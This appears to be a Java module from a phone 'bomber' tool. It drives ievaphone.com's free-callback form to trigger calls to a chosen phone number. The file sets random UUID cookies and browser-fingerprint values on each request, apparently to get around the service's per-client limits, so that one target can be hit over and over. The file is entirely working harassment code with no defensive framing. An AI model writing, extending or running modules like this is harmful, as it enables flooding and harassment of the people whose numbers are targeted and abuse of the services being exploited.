package com.dm.bomber.services;

import java.util.UUID;

import okhttp3.HttpUrl;
import okhttp3.Request;

public class Ievaphone extends ParamsService {

    public Ievaphone() {
        setUrl("https://ievaphone.com/call-my-phone/web/request-free-call");
        setMethod(POST);
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Cookie", "smscookie=" + UUID.randomUUID().toString());

        return super.buildRequest(builder);
    }

    @Override
    public void buildParams(HttpUrl.Builder builder) {
        builder.addQueryParameter("phone", getFormattedPhone());
        builder.addQueryParameter("domain", "IEVAPHONE");
        builder.addQueryParameter("browser", "undefined;");
        builder.addQueryParameter("fgp", UUID.randomUUID().toString());
        builder.addQueryParameter("fgp2", UUID.randomUUID().toString());
    }
}
